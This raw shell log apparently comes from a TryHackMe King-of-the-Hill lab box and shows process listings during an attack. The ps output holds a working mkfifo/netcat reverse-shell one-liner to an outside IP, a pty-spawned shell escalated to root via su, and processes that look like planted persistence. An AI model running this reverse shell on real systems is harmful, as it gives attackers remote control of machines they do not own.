ls -la /proc/8903/cwd
lrwxrwxrwx 1 root root 0 Dec  8 23:17 /proc/8903/cwd -> /home/ramen
cd /home/ramen
ls -lah
total 32K
drwxr-xr-x 4 ramen ramen 4.0K Dec  8 22:55 .
drwxr-xr-x 8 root  root  4.0K Dec  8 23:00 ..
-rw------- 1 ramen ramen  151 Dec  8 22:55 .bash_history
-rw-r--r-- 1 ramen ramen  220 Mar 20  2020 .bash_logout
-rw-r--r-- 1 ramen ramen 3.7K Mar 20  2020 .bashrc
drwx------ 2 ramen ramen 4.0K Mar 21  2020 .cache
drwx------ 3 ramen ramen 4.0K Mar 21  2020 .gnupg
-rw-r--r-- 1 ramen ramen  825 Mar 28  2020 .profile
ls -la /proc/9964/cwd
lrwxrwxrwx 1 root root 0 Dec  8 23:18 /proc/9964/cwd -> /
w
 23:20:27 up 48 min,  0 users,  load average: 0.24, 0.46, 0.76
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
ps aufx
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         2  0.0  0.0      0     0 ?        S    22:31   0:00 [kthreadd]
root         4  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/0:0H]
root         6  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [mm_percpu_wq]
root         7  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [ksoftirqd/0]
root         8  0.0  0.0      0     0 ?        I    22:31   0:01  \_ [rcu_sched]
root         9  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [rcu_bh]
root        10  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [migration/0]
root        11  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [watchdog/0]
root        12  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [cpuhp/0]
root        13  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kdevtmpfs]
root        14  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [netns]
root        15  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [rcu_tasks_kthre]
root        16  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kauditd]
root        17  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [xenbus]
root        18  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [xenwatch]
root        19  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [kworker/0:1]
root        20  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [khungtaskd]
root        21  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [oom_reaper]
root        22  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [writeback]
root        23  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kcompactd0]
root        24  0.0  0.0      0     0 ?        SN   22:31   0:00  \_ [ksmd]
root        25  0.0  0.0      0     0 ?        SN   22:31   0:00  \_ [khugepaged]
root        26  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [crypto]
root        27  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kintegrityd]
root        28  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kblockd]
root        29  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ata_sff]
root        30  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [md]
root        31  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [edac-poller]
root        32  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [devfreq_wq]
root        33  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [watchdogd]
root        36  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kswapd0]
root        37  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/u31:0]
root        38  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [ecryptfs-kthrea]
root        80  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kthrotld]
root        81  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [acpi_thermal_pm]
root        82  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [scsi_eh_0]
root        83  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [scsi_tmf_0]
root        84  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [scsi_eh_1]
root        85  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [scsi_tmf_1]
root        91  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ipv6_addrconf]
root       100  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kstrp]
root       117  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [charger_manager]
root       167  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ttm_swap]
root       263  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [raid5wq]
root       316  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [jbd2/xvda2-8]
root       317  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ext4-rsv-conver]
root       367  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/0:1H]
root       399  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [iscsi_eh]
root       402  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib-comp-wq]
root       403  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib-comp-unb-wq]
root       404  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib_mcast]
root       405  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib_nl_sa_wq]
root       406  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [rdma_cm]
root       419  0.0  0.0      0     0 ?        S<   22:31   0:00  \_ [loop0]
root       421  0.0  0.0      0     0 ?        S<   22:31   0:00  \_ [loop1]
root      1425  0.0  0.0      0     0 ?        I    22:43   0:00  \_ [kworker/u30:2]
root      7578  0.0  0.0      0     0 ?        I    23:11   0:00  \_ [kworker/0:0]
root      9219  0.0  0.0      0     0 ?        I    23:14   0:00  \_ [kworker/u30:3]
root      9220  0.0  0.0      0     0 ?        I    23:14   0:00  \_ [kworker/u30:4]
root     10645  0.0  0.0      0     0 ?        I    23:16   0:00  \_ [kworker/0:2]
root         1  0.2  0.8 159936  9056 ?        Ss   22:31   0:07 /sbin/init maybe-ubiquity
root       397  0.0  1.9 127876 19976 ?        S<s  22:31   0:01 /lib/systemd/systemd-journald
root       408  0.0  0.1  97708  1832 ?        Ss   22:31   0:00 /sbin/lvmetad -f
root       417  0.1  0.4  45560  4512 ?        Ss   22:31   0:05 /lib/systemd/systemd-udevd
systemd+   508  0.0  0.3 141936  3320 ?        Ssl  22:31   0:00 /lib/systemd/systemd-timesyncd
systemd+   610  0.0  0.5  80056  5180 ?        Ss   22:31   0:00 /lib/systemd/systemd-networkd
systemd+   623  0.0  0.5  70640  5288 ?        Ss   22:31   0:00 /lib/systemd/systemd-resolved
tryhack+   729  0.0  0.3 106640  3604 ?        Ssl  22:31   0:00 /home/tryhackme/img
root       743  0.0  0.6  70856  6300 ?        Ss   22:31   0:00 /lib/systemd/systemd-logind
bread      745  0.0  0.4 107104  5028 ?        Ssl  22:31   0:00 /home/bread/main
bread     1549  0.0  0.3  11616  3172 ?        S    23:00   0:00  \_ /bin/bash -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.11.55.164 1337 >/tmp/f
bread     1556  0.0  0.0   8420   808 ?        S    23:00   0:00      \_ cat /tmp/f
bread     1557  0.0  0.0   6732   900 ?        S    23:00   0:00      \_ sh -i
root      1563  0.0  0.3  19216  3976 ?        S    23:00   0:00      |   \_ -i
root     12270  0.0  0.3  37080  3464 ?        R    23:20   0:00      |       \_ ps aufx
bread     1558  0.0  0.2  17820  2216 ?        S    23:00   0:00      \_ nc 10.11.55.164 1337
syslog     747  0.0  0.4 263036  4368 ?        Ssl  22:31   0:00 /usr/sbin/rsyslogd -n
root       751  0.0  0.3  33996  3360 ?        Ss   22:31   0:00 /usr/sbin/inetd
root       753  0.0  0.1 161076  1676 ?        Ssl  22:31   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
root       755  0.0  1.7 169096 17148 ?        Ssl  22:31   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
daemon     756  0.0  0.2  28332  2352 ?        Ss   22:31   0:00 /usr/sbin/atd -f
message+   763  0.0  0.4  50108  4356 ?        Ss   22:31   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root       788  0.0  0.6 286332  6968 ?        Ssl  22:31   0:00 /usr/lib/accountsservice/accounts-daemon
root       789  0.0  0.6 106640  6544 ?        Ssl  22:31   0:00 /root/koth
root       792  0.3  2.4 557680 25112 ?        Ssl  22:31   0:09 /usr/lib/snapd/snapd
root       800  0.0  1.9 185948 20096 ?        Ssl  22:31   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root       809  0.0  0.2  14664  2248 ttyS0    Ss+  22:31   0:00 /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220
root       815  0.0  0.1  14888  1904 tty1     Ss+  22:31   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root       816  0.0  0.7 291456  7216 ?        Ssl  22:31   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       819  0.0  0.5  72300  5728 ?        Ss   22:31   0:00 /usr/sbin/sshd -D
root      8521  0.0  0.7 108008  7152 ?        Ss   23:12   0:00  \_ sshd: ramen [priv]
ramen     8623  0.0  0.5 108632  5072 ?        S    23:13   0:00      \_ sshd: ramen@notty
ramen     8649  0.0  0.0   6732   904 ?        Ss   23:13   0:00          \_ /bin/sh
ramen     8848  0.0  0.9  39112  9808 ?        S    23:13   0:00              \_ python3 -c import pty;pty.spawn("/bin/sh")
ramen     8849  0.0  0.0   6732   824 pts/1    Ss   23:13   0:00                  \_ /bin/sh
root      8902  0.0  0.3  61792  3788 pts/1    S+   23:13   0:00                      \_ su -c /bin/sh
root      8903  0.0  0.1   6732  1820 ?        Ss   23:13   0:00                          \_ /bin/sh
mysql      841  0.1 17.5 1161928 176760 ?      Sl   22:32   0:03 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid
ramen      956  0.0  0.7  76644  7476 ?        Ss   22:32   0:00 /lib/systemd/systemd --user
ramen      966  0.0  0.2 111792  2448 ?        S    22:32   0:00  \_ (sd-pam)
root      1575  4.7  0.0   1000    56 ?        Ds   23:00   0:56 /li
root      9253  0.0  1.5 1115248 15972 ?       Ssl  23:14   0:00 /usr/sbin/cron -f
root      9964  0.0  1.5 722812 15236 ?        Ssl  23:15   0:00 /usr/bin/systemd-pam
